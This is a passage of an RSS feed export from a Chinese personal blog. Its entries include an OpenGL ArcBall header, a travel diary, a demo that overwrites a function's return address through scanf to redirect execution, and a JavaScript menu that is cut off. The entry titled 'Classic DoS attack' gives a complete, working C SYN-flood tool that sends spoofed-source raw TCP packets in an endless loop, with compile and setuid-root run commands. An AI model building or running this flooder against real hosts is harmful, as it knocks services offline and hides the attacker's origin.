//鼠标拖动计算旋转<br>&nbsp;&nbsp;&nbsp; void&nbsp;&nbsp;&nbsp; drag(const Point2fT* NewPt, Quat4fT* NewRot);<br><br>&nbsp;&nbsp;&nbsp; //更新鼠标状态<br>&nbsp;&nbsp;&nbsp; void&nbsp;&nbsp;&nbsp; upstate();<br>&nbsp;&nbsp;&nbsp; //void&nbsp;&nbsp;&nbsp; mousemove(WPARAM wParam,LPARAM lParam);<br><br>protected:<br>&nbsp;&nbsp;&nbsp; Vector3fT&nbsp;&nbsp; StVec;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //保存鼠标点击的坐标<br>&nbsp;&nbsp;&nbsp; Vector3fT&nbsp;&nbsp; EnVec;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //保存鼠标拖动的坐标<br>&nbsp;&nbsp;&nbsp; GLfloat&nbsp;&nbsp;&nbsp;&nbsp; AdjustWidth;&nbsp;&nbsp;&nbsp; //宽度的调整因子<br>&nbsp;&nbsp;&nbsp; GLfloat&nbsp;&nbsp;&nbsp;&nbsp; AdjustHeight;&nbsp;&nbsp; //长度的调整因子<br>public:<br>&nbsp;&nbsp;&nbsp; Matrix4fT&nbsp;&nbsp; Transform;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //计算变换&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; <br>&nbsp;&nbsp;&nbsp; Matrix3fT&nbsp;&nbsp; LastRot;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //上一次的旋转 <br>&nbsp;&nbsp;&nbsp; Matrix3fT&nbsp;&nbsp; ThisRot;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //这次的旋转<br>&nbsp;&nbsp;&nbsp; float zoomRate;<br>&nbsp;&nbsp;&nbsp; float lastZoomRate;<br><br>&nbsp;&nbsp;&nbsp; bool&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; isDragging;&nbsp;&nbsp;&nbsp;&nbsp; // 是否拖动<br>&nbsp;&nbsp;&nbsp; bool&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; isRClicked;&nbsp;&nbsp;&nbsp;&nbsp; // 是否右击鼠标<br>&nbsp;&nbsp;&nbsp; bool&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; isClicked;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // 是否点击鼠标<br>&nbsp;&nbsp;&nbsp; bool&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; isZooming;&nbsp;&nbsp;&nbsp; //是否正在缩放<br>&nbsp;&nbsp;&nbsp; Point2fT&nbsp;&nbsp;&nbsp; LastPt;&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; <br>&nbsp;&nbsp;&nbsp; Matrix4fT origTransform;<br>&nbsp;&nbsp;&nbsp; Point2fT&nbsp;&nbsp;&nbsp; MousePt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // 当前的鼠标位置<br><br>} ArcBallT;<br><br>#endif<br>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Graphics</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/33731937201031471924201/</guid>
    </item>
    <item>
      <title>
<![CDATA[成都行]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/33731937200791682734917/</link>
      <description>
<![CDATA[<P>从邢台乘T586，从14：53到16：00到石家庄，然后坐55路到省民航局，乘大巴17：30-18：00到正定机场，EU2222从22：45-1：30到成都双流机场；303路出飞机场，2：00-3：00走到一环，4：00走至宾馆，7：00从科大到宾馆。</P>
<P>都江堰，国宴宾馆，三十一号7：00到19：00坐车到九寨；行程40公里，</P>
<P>九寨玩了一天</P>
<P>返回成都路上一天</P>
<P>然后在成都过了一晚，第二天晚上坐火车经42小时返回大连。崩溃。回到大连后大连连续下了一个月的雨。</P>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Mood</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/33731937200791682734917/</guid>
    </item>
    <item>
      <title>
<![CDATA[让程序跑飞]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/33731937201002182947780/</link>
      <description>
<![CDATA[C语言函数调用时，真堆栈结构如下所示<br><span style="font-family: 宋体;">+--------------------+<br>|下一条指令地址</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; |<br style="font-family: 宋体;"><span style="font-family: 宋体;">+--------------------+<br>|%ebp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; |<br>+--------------------+<br>|第一个局部变量地址&nbsp; |<br>+--------------------+<br>|第二个局部变量&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; |<br>+--------------------+<br>|.....&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; |<br>+--------------------+<br>这样就可以通过第一个局部变量的地址+2得到下一条指令地址，如果程序中可以输入，则可以通过溢出的方式修改之，从而改变程序流程，下面的程序可以从f跳到g,将输出的G的地址输入，程序就跳到G了。<br>$ cc test.c<br>$ ./a.out<br>G:0x8048424<br>0x8048424<br>Haha, got G<br>Segmentation fault<br><br></span>#include &lt;stdio.h&gt;<br>int g(){<br>&nbsp;&nbsp;&nbsp; printf("Haha, got G\n");<br>}<br>int f(){<br>&nbsp;&nbsp;&nbsp; int a = 2;<br>&nbsp;//&nbsp;&nbsp; printf("local:%p, func:%p\n",&amp;a,f);<br>//&nbsp;&nbsp;&nbsp; printf("upper:%p\n",*(((int*)&amp;a)+2));<br>&nbsp;&nbsp;&nbsp; printf("G:%p\n",g);<br>&nbsp;&nbsp;&nbsp; scanf("%p",(int*)&amp;a+2);<br>}<br>int main(){<br>&nbsp;&nbsp;&nbsp; f();<br>&nbsp;&nbsp;&nbsp; return 0;<br>}<br>~<br><br>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Unix</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/33731937201002182947780/</guid>
    </item>
    <item>
      <title>
<![CDATA[经典的Dos攻击]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/33731937200941410186928/</link>
      <description>
<![CDATA[<style>BODY { FONT-FAMILY:Tahoma; FONT-SIZE:10pt }
P { FONT-FAMILY:Tahoma; FONT-SIZE:10pt }
DIV { FONT-FAMILY:Tahoma; FONT-SIZE:10pt }
TD { FONT-FAMILY:Tahoma; FONT-SIZE:10pt }
</style>/*<br>*Dos攻击代码<br>*dos.c<br>
<div>gcc dos.c -o dos</div>
<div>chown root dos</div>
<div>chmod +s dos</div>
<div>./dos 192.168.1.111<br></div>*/<br><div><font face="monospace">#include &lt;stdio.h&gt;<br>#include &lt;stdlib.h&gt;<br>#include &lt;string.h&gt;<br>#include &lt;sys/types.h&gt;<br>#include &lt;sys/socket.h&gt;<br>#include &lt;netinet/tcp.h&gt;<br>#include &lt;netinet/ip.h&gt;<br>#include &lt;netinet/in.h&gt;<br>#include &lt;unistd.h&gt;<br><br>#define DESTPORT 80<br>#define LOCALPORT 8888<br>#define oops(msg) {perror(msg);exit(1);}<br>void send_tcp(int sockfd, struct sockaddr_in *addr);<br>unsigned short check_sum(unsigned short *addr, int len);<br>int main(int argc, char **argv){<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;int sockfd;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;struct sockaddr_in addr;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;struct hostent *host;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;int on = 1;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(argc!=2){<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fprintf(stderr, "usage:%s hostname\n\a",argv[0]);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;exit(1);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;memset((void*)&amp;addr,0,sizeof(addr));<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;addr.sin_family = AF_INET;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;addr.sin_port =htons(DESTPORT);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;inet_aton(argv[1],&amp;addr.sin_addr);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sockfd = socket(PF_INET,SOCK_RAW,IPPROTO_TCP);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(sockfd&lt;0)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;oops("socket");<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;setsockopt(sockfd,IPPROTO_IP,IP_HDRINCL,&amp;on,sizeof(on));<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;setuid(getpid());<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;send_tcp(sockfd,&amp;addr);<br>}<br>void send_tcp(int sockfd, struct sockaddr_in *addr){<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;char buffer[100];<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;struct ip *ip;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;struct tcphdr *tcp;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;int head_len;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;head_len = sizeof(struct ip)+sizeof(struct tcphdr);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;memset(buffer, 0, 100);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ip = (struct ip*)buffer;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ip-&gt;ip_v = IPVERSION;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ip-&gt;ip_hl = sizeof(struct ip)&gt;&gt;2;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ip-&gt;ip_tos = 0;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ip-&gt;ip_len = htons(head_len);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ip-&gt;ip_id=0;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ip-&gt;ip_off = 0;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ip-&gt;ip_ttl = MAXTTL;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ip-&gt;ip_p = IPPROTO_TCP;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ip-&gt;ip_sum = 0;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ip-&gt;ip_dst = addr-&gt;sin_addr;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;tcp = (struct tcphdr*)(buffer+sizeof(struct ip));<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;tcp-&gt;source = htons(LOCALPORT);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;tcp-&gt;dest = addr-&gt;sin_port;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;tcp-&gt;seq = random();<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;tcp-&gt;ack_seq = 0;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;tcp-&gt;doff = 5;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;tcp-&gt;syn = 1;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;tcp-&gt;check = 0;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf("Hacking...\n");</font></div>
<div><font face="monospace">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;while(1){<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ip-&gt;ip_src.s_addr = random();<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;tcp-&gt;check=check_sum((unsigned short*)tcp,<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sizeof(struct tcphdr));<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sendto(sockfd,buffer,head_len,0,addr,<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sizeof(struct sockaddr_in));<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br>}<br>unsigned short check_sum(unsigned short *addr, int len){<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;register int nleft = len;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;register int sum = 0;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;register short *w = addr;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;short answer = 0;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;while(nleft&gt;1){<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sum += *w++;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;nleft -=2;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(nleft == 1){<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*(unsigned char*)(&amp;answer) = *(unsigned char*)w;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sum += answer;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sum = (sum&gt;&gt;16)+(sum&amp;0xffff);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sum += (sum&gt;&gt;16);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;answer = ~sum;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return (answer);<br>}</font></div>
]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Unix</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/33731937200941410186928/</guid>
    </item>
    <item>
      <title>
<![CDATA[模拟QQ菜单效果[转]]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/337319372007111174655552/</link>
      <description>
<![CDATA[<P><A href="http://img.blog.163.com/photo/iRVsxKL2R8wGa4s7FeTzcQ==/633037222622583636.jpg" target=_blank><IMG src="http://img.blog.163.com/photo/iRVsxKL2R8wGa4s7FeTzcQ==/633037222622583636.jpg"></A></P>
<P>&lt;html&gt;<BR>&lt;html&gt;<BR>&lt;head&gt;<BR>&lt;title&gt;模拟QQ菜单效果&lt;/title&gt;<BR>&lt;meta http-equiv="Content-Type" content="text/html; charset=gb2312" /&gt;<BR>&lt;/head&gt;<BR>&lt;body&gt;<BR>&lt;STYLE type="text/css"&gt;<BR>A:link { COLOR: #000000; FONT-SIZE: 12px; TEXT-DECORATION: none}<BR>A:visited { COLOR: #000000; FONT-SIZE: 12px; TEXT-DECORATION: none}<BR>A:hover { COLOR: #006CD9; FONT-SIZE: 12px; TEXT-DECORATION: none}<BR>BODY { FONT-SIZE: 12px;}<BR>TD { FONT-SIZE: 12px; line-height: 150%}<BR>&lt;/style&gt;<BR>&lt;script language="JavaScript"&gt;<BR>&lt;!--<BR>function showitem(id,name)<BR>{<BR>&nbsp;return ("&lt;span&gt;&lt;a href='"+id+"' target=_blank&gt;"+name+"&lt;/a&gt;&lt;/span&gt;&lt;br /&gt;")<BR>}<BR>function switchoutlookBar(number)<BR>{<BR>&nbsp;var i = outlookbar.opentitle;<BR>&nbsp;outlookbar.opentitle=number;<BR>&nbsp;var id1,id2,id1b,id2b<BR>&nbsp;if (number!=i &amp;&amp; outlooksmoothstat==0){<BR>&nbsp; if (number!=-1)<BR>&nbsp; {<BR>&nbsp;&nbsp; if (i==-1){<BR>&nbsp;&nbsp;&nbsp; id2="blankdiv";<BR>&nbsp;&nbsp;&nbsp; id2b="blankdiv";<BR>&nbsp;&nbsp; }<BR>&nbsp;&nbsp; else{<BR>&nbsp;&nbsp;&nbsp; id2="outlookdiv"+i;<BR>&nbsp;&nbsp;&nbsp; id2b="outlookdivin"+i;<BR>&nbsp;&nbsp;&nbsp; document.all("outlooktitle"+i).style.border="1px none navy";<BR>&nbsp;&nbsp;&nbsp; document.all("outlooktitle"+i).style.background=outlookbar.maincolor;<BR>&nbsp;&nbsp;&nbsp; document.all("outlooktitle"+i).style.color="#ffffff";<BR>&nbsp;&nbsp;&nbsp; document.all("outlooktitle"+i).style.textalign="center";<BR>&nbsp;&nbsp; }<BR>&nbsp;&nbsp; id1="outlookdiv"+number<BR>&nbsp;&nbsp; id1b="outlookdivin"+number<BR>&nbsp;&nbsp; document.all("outlooktitle"+number).style.border="1px none white";<BR>&nbsp;&nbsp; document.all("outlooktitle"+number).style.background=outlookbar.maincolor; //title<BR>&nbsp;&nbsp; document.all("outlooktitle"+number).style.color="#ffffff";<BR>&nbsp;&nbsp; document.all("outlooktitle"+number).style.textalign="center";<BR>&nbsp;&nbsp; smoothout(id1,id2,id1b,id2b,0);<BR>&nbsp; }<BR>&nbsp; else<BR>&nbsp; {<BR>&nbsp;&nbsp; document.all("blankdiv").style.display="";<BR>&nbsp;&nbsp; document.all("blankdiv").sryle.height="100%";<BR>&nbsp;&nbsp; document.all("outlookdiv"+i).style.display="none";<BR>&nbsp;&nbsp; document.all("outlookdiv"+i).style.height="0%";<BR>&nbsp;&nbsp; document.all("outlooktitle"+i).style.border="1px none navy";<BR>&nbsp;&nbsp; document.all("outlooktitle"+i).style.background=outlookbar.maincolor;<BR>&nbsp;&nbsp; document.all("outlooktitle"+i).style.color="#ffffff";<BR>&nbsp;&nbsp; document.all("outlooktitle"+i).style.textalign="center";<BR>&nbsp; }<BR>&nbsp;}<BR>}<BR>function smoothout(id1,id2,id1b,id2b,stat)<BR>{<BR>&nbsp;if(stat==0){<BR>&nbsp; tempinnertext1=document.all(id1b).innerHTML;<BR>&nbsp; tempinnertext2=document.all(id2b).innerHTML;<BR>&nbsp; document.all(id1b).innerHTML="";<BR>&nbsp; document.all(id2b).innerHTML="";<BR>&nbsp; outlooksmoothstat=1;<BR>&nbsp; document.all(id1b).style.overflow="hidden";<BR>&nbsp; document.all(id2b).style.overflow="hidden";<BR>&nbsp; document.all(id1).style.height="0%";<BR>&nbsp; document.all(id1).style.display="";<BR>&nbsp; setTimeout("smoothout('"+id1+"','"+id2+"','"+id1b+"','"+id2b+"',"+outlookbar.inc+")",outlookbar.timedalay);<BR>&nbsp;}<BR>&nbsp;else<BR>&nbsp;{<BR>&nbsp; stat+=outlookbar.inc;<BR>&nbsp; if (stat&gt;100)<BR>&nbsp;&nbsp; stat=100;<BR>&nbsp; document.all(id1).style.height=stat+"%";<BR>&nbsp; document.all(id2).style.height=(100-stat)+"%";<BR>&nbsp; if (stat&lt;100) <BR>&nbsp;&nbsp; setTimeout("smoothout('"+id1+"','"+id2+"','"+id1b+"','"+id2b+"',"+stat+")",outlookbar.timedalay);<BR>&nbsp; else<BR>&nbsp; {<BR>&nbsp;&nbsp; document.all(id1b).innerHTML=tempinnertext1;<BR>&nbsp;&nbsp; document.all(id2b).innerHTML=tempinnertext2;<BR>&nbsp;&nbsp; outlooksmoothstat=0;<BR>&nbsp;&nbsp; document.all(id1b).style.overflow="auto";<BR>&nbsp;&nbsp; document.all(id2).style.display="none";<BR>&nbsp; }<BR>&nbsp;}<BR>}<BR>function getOutLine()<BR>{<BR>&nbsp;outline="&lt;table "+outlookbar.otherclass+"&gt;";<BR>&nbsp;for (i=0;i&lt;(outlookbar.titlelist.length);i++)<BR>&nbsp;{<BR>&nbsp; outline+="&lt;tr&gt;&lt;td name=outlooktitle"+i+" id=outlooktitle"+i+" "; <BR>&nbsp; if (i!=outlookbar.opentitle) <BR>&nbsp;&nbsp; outline+=" nowrap align=center style='cursor:hand;background-color:"+outlookbar.maincolor+";color:#ffffff;height:20;border:1 none navy' ";<BR>&nbsp; else<BR>&nbsp;&nbsp; outline+=" nowrap align=center style='cursor:hand;background-color:"+outlookbar.maincolor+";color:white;height:20;border:1 none white' ";<BR>&nbsp; outline+=outlookbar.titlelist[i].otherclass<BR>&nbsp; outline+=" onclick='switchoutlookBar("+i+")'&gt;&lt;span class=smallFont&gt;";<BR>&nbsp; outline+=outlookbar.titlelist[i].title+"&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;";<BR>&nbsp; outline+="&lt;tr&gt;&lt;td name=outlookdiv"+i+" valign=top align=center id=outlookdiv"+i+" style='width:100%"<BR>&nbsp; if (i!=outlookbar.opentitle) <BR>&nbsp;&nbsp; outline+=";display:none;height:0%;";<BR>&nbsp; else<BR>&nbsp;&nbsp; outline+=";display:;height:100%;";<BR>&nbsp; outline+="'&gt;&lt;div name=outlookdivin"+i+" id=outlookdivin"+i+" style='overflow:auto;width:100%;height:100%'&gt;";<BR>&nbsp; for (j=0;j&lt;outlookbar.itemlist[i].length;j++)<BR>&nbsp;&nbsp; outline+=showitem(outlookbar.itemlist[i][j].key,outlookbar.itemlist[i][j].title);<BR>&nbsp; outline+="&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;"<BR>&nbsp;}<BR>&nbsp;outline+="&lt;/table&gt;"<BR>&nbsp;return outline<BR>}<BR>function show()<BR>{<BR>&nbsp;var outline;<BR>&nbsp;outline="&lt;div id=outLookBarDiv name=outLookBarDiv style='width=100%;height:100%'&gt;"<BR>&nbsp;outline+=outlookbar.getOutLine();<BR>&nbsp;outline+="&lt;/div&gt;"<BR>&nbsp;document.write(outline);<BR>}<BR>function theitem(intitle,instate,inkey)<BR>{<BR>&nbsp;this.state=instate;<BR>&nbsp;this.otherclass=" nowrap ";<BR>&nbsp;this.key=inkey;<BR>&nbsp;this.title=intitle;<BR>}<BR>function addtitle(intitle)<BR>{<BR>&nbsp;outlookbar.itemlist[outlookbar.titlelist.length]=new Array();<BR>&nbsp;outlookbar.titlelist[outlookbar.titlelist.length]=new theitem(intitle,1,0);<BR>&nbsp;return(outlookbar.titlelist.length-1);<BR>}<BR>function additem(intitle,parentid,inkey)<BR>{<BR>&nbsp;if (parentid&gt;=0 &amp;&amp; parentid&lt;=outlookbar.titlelist.length)<BR>&nbsp;{<BR>&nbsp; outlookbar.itemlist[parentid][outlookbar.itemlist[parentid].length]=new theitem(intitle,2,inkey);<BR>&nbsp; outlookbar.itemlist[parentid][outlookbar.itemlist[parentid].length-1].otherclass=" nowrap align=left style='height:5' ";<BR>&nbsp; return(outlookbar.itemlist[parentid].length-1);<BR>&nbsp;}<BR>&nbsp;else<BR>&nbsp; additem=-1;<BR>}<BR>function outlook()<BR>{<BR>&nbsp;this.titlelist=new Array();<BR>&nbsp;this.itemlist=new Array();<BR>&nbsp;this.divstyle="style='height:100%;width:100%;overflow:auto' align=center";<BR>&nbsp;this.otherclass="border=0 cellspacing='0' cellpadding='0' style='height:100%;width:100%'valign=middle align=center ";<BR>&nbsp;this.addtitle=addtitle;<BR>&nbsp;this.additem=additem;<BR>&nbsp;this.starttitle=-1;<BR>&nbsp;this.show=show;<BR>&nbsp;this.getOutLine=getOutLine;<BR>&nbsp;this.opentitle=this.starttitle;<BR>&nbsp;this.reflesh=outreflesh;<BR>&nbsp;this.timedelay=50;<BR>&nbsp;this.inc=10;<BR>&nbsp;this.maincolor = "#336699"<BR>}<BR>function outreflesh()<BR>{<BR>&nbsp;document.all("outLookBarDiv").innerHTML=outlookbar.getOutLine();<BR>}<BR>function locatefold(foldname)<BR>{<BR>&nbsp;if (foldname=="")<BR>&nbsp; foldname = outlookbar.titlelist[0].title<BR>&nbsp;for (var i=0;i&lt;outlookbar.titlelist.length;i++)<BR>&nbsp;{<BR>&nbsp; if(foldname==outlookbar.titlelist[i].title)<BR>&nbsp; {<BR>&nbsp;&nbsp; outlookbar.starttitle=i;<BR>&nbsp;&nbsp; outlookbar.opentitle=i;<BR>&nbsp; }<BR>&nbsp;}<BR>}<BR>var outlookbar=new outlook();<BR>var tempinnertext1,tempinnertext2,outlooksmoothstat<BR>outlooksmoothstat = 0;<BR>var t;<BR>t=outlookbar.addtitle('技术文档')<BR>outlookbar.additem('Web开发',t,'http://sc.jcwcn.com/tx/js/index.asp')<BR>outlookbar.additem('数据库',t,'http://sc.jcwcn.com/tx/js/index.asp')<BR>t=outlookbar.addtitle('计算机技术')<BR>outlookbar.additem('操作系统',t,'http://sc.jcwcn.com/tx/js/index.asp')<BR>outlookbar.additem('网络安全',t,'http://sc.jcwcn.com/tx/js/index.asp')<BR>outlookbar.additem('小技巧',t,'http://sc.jcwcn.com/tx/js/index.asp')<BR>outlookbar.additem('硬件相关',t,'http://sc.jcwcn.com/tx/js/index.asp')<BR>t=outlookbar.addtitle('文摘')<BR>outlookbar.additem('求职 ',t,'http://sc.jcwcn.com/tx/js/index.asp')<BR>outlookbar.additem('杂文 ',t,'http://sc.jcwcn.com/tx/js/index.asp')<BR>outlookbar.additem('生活 ',t,'http://sc.jcwcn.com/tx/js/index.asp')<BR>outlookbar.additem('人生 ',t,'http://sc.jcwcn.com/tx/js/index.asp')<BR>outlookbar.additem('健康 ',t,'http://sc.jcwcn.com/tx/js/index.asp')<BR>outlookbar.additem('知识 ',t,'http://sc.jcwcn.com/tx/js/index.asp')<BR>outlookbar.additem('爱情 ',t,'http://sc.jcwcn.com/tx/js/index.asp')<BR>outlookbar.additem('幽默笑话 